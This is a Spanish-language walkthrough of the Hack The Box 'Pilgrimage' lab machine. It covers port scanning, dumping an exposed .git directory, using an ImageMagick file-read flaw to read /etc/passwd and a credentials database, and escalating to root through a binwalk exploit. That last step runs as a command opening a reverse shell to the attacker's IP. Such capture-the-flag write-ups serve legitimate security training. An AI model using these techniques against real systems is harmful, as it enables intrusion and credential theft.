



# PortScan

```
nmap -sCV -p22,80 -oN targeted 10.10.11.219

Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.058s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20be60d295f628c1b7e9e81706f168f3 (RSA)
|   256 0eb6a6a8c99b4173746e70180d5fe0af (ECDSA)
|_  256 d14e293c708669b4d72cc80b486e9804 (ED25519)
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Pilgrimage - Shrink Your Images
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 30 09:58:12 2023 -- 1 IP address (1 host up) scanned in 9.34 seconds
```

# Sitio Web


![[Pasted image 20231030160138.png]]

Tendríamos este sitio web, el cual podemos registrarnos, para loguerarnos y posterior a esto subir fotos, aunque no es necesario, pero sí nos logueamos sería más fácil para ver las fotos que hemos subido con su ruta de donde está subida.

Podemos analizar el código fuente, probar con credenciales básicas & default para intentar entrar como Root pero no encontaríamos nada, más no obstante al fuzzear la dirección del sitio web con "**GoBuster**", descubriríamos los siguientes directorios **Git**.

```
 gobuster dir -u http://pilgrimage.htb/ -w /usr/share/SecLists/Discovery/Web-Content/common.txt -t 20 -x php,html,js,txt


/.git/HEAD            (Status: 200) [Size: 23]
/.git/logs/           (Status: 403) [Size: 153]
/.git                 (Status: 301) [Size: 169] [--> http://pilgrimage.htb/.git/]
/.git/logs/.html      (Status: 403) [Size: 153]                                  
/.git/config          (Status: 200) [Size: 92]                                   
```

Vemos que el recurso **Git** que usualmente suele estar oculto está expuesto, estos podríamos descargarlo manualmente, pero sí indagamos podríamos encontrar herramientas qué descargan los recursos automáticamente, como por ejemplo esta [Git Dumper](https://github.com/arthaud/git-dumper), la cual nos descargará los recursos de la URL indicada con el directorio **/.git** indicado, sé recomienda leer cómo usarla en el repositorio de la misma herramienta.


![[Pasted image 20231030161111.png]]

Sí nos abrimos el "**index.php**".


![[Pasted image 20231030161308.png]]


Notaremos qué está usando el el "**Magick Convert**", para hacer un resize del %50, y meterlo en la ruta de descargar con un nuevo nombre, y la extensión de la imagen, y más abajo nos chiva la ruta absoluta donde está guardando esto.

al descargar los recursos, obtuvimos el binario del "**magick**", así que procedemos a ver la versión para poder ver si está desactualizada y es vulnerable a algo.

![[Pasted image 20231030161752.png]]

Sí indagamos en busca de vulnerabilidades de esta versión de **magick**, encontraríamos una vulnerabilidad de un "**Arbitrary File Read**" en [Exploit-DB](https://www.exploit-db.com/exploits/51261), la cuál nos facilita un [PoC](https://github.com/voidz0r/CVE-2022-44268), del cuál podemos aprovecharnos para crear imágenes "contaminadas" para aprovecharnos del File Read, y llevar a cabo un LFI.

Una vez subamos la imagen, nos descargamos la misma imagen en local con "wget" para visualizar los metadatos de la misma con "identify".

![[Pasted image 20231030163405.png]]

Nos representará una cadena en **hexadecimal**, la cual debemos convertir en texto claro para que sea legible y en éste caso ver el "/etc/passwd", en este caso usaremos un convertidor online para convertirlo en texto claro.

![[Pasted image 20231030163639.png]]


Como vemos hemos llevado a cabo un **LFI** y leído el passwd, pero sí intentamos listar las claves del .ssh no veremos nada, ni indagando encontraríamos nada interesante, por lo qué nos aprovechamos qué sabemos la ruta absoluta de la db, que es "**/var/db/pilgrimage**" para tratar de ver sí conseguimos credenciales.

![[Pasted image 20231030164035.png]]

En la cual al convertirla a texto plano encontraríamos las credenciales de **emily** para conectarnos a través de **SSH**.


# Escalada de Privilegios


Usamos **pspy64** para buscar posibles brechas qué podamos aprovechar para escalar nuestro privilegios a Root.

![[Pasted image 20231030164924.png]]

Vemos qué Root está ejecutando un script en bash, en el cual podemos leer y dentro tiene el siguiente código:

```bash
#!/bin/bash

blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done

```

El script monitorea el directorio `/var/www/pilgrimage.htb/shrunk/` en busca de archivos recién creados. Luego, verifica si el contenido de cada archivo contiene ciertas cadenas de texto prohibidas, como "Executable script" o "Microsoft executable". Si se encuentra alguna de estas cadenas, el archivo se elimina automáticamente, y lo está haciendo con el binario binwalk.

![[Pasted image 20231030165452.png]]

Cuyo versión **binwalk**, sí indagamos en busca de vulnerabilidades encontraremos qué podemos llevar a cabo un **RCE** con esta versión en específico según Exploit-DB, el cual ahí mismo nos proporciona un exploit programado en python para otorgarnos una Reverse Shell. [(Click aquí para ver exploit)](https://www.exploit-db.com/exploits/51249)

El cuál debemos ejecutarnos estando en la ruta "/var/www/pilgrimage.htb/shrunk" y indicar los parámetros de nuestra IP que estarmos escuchando y nuestro puerto.

```
python3 exploit.py image.png 10.10.14.x 443
```

![[Pasted image 20231030170607.png]]